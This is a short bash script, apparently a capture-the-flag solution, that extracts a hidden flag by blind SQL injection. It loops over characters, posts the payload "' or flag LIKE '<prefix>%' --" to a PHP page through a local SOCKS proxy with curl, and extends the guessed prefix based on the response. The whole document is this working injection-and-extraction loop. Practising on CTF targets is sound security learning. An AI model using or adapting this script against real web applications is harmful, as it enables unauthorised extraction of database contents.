#!/bin/bash
incrementalString=""
tempString=""
chars="abcdefghijklmnopqrstuvwxyz1234567890{}-~()"
while [ 1 ] ; do
	for (( i=0; i<${#chars}; i++ )); do
  		char="${chars:$i:1}"
		tempString=$incrementalString
		
		tempString=$tempString$char

		id="' or flag LIKE '$tempString%' --"
		curl  -s -x socks5h://localhost:2223 'http://back.alley.kaa/niveau2.php' --data-raw "id=$id" | grep * > /dev/null
		if [ $? -ne 0 ] ; then
			incrementalString=$tempString
			echo "Incremented : $incrementalString"
		fi


		echo $tempString
	done
done
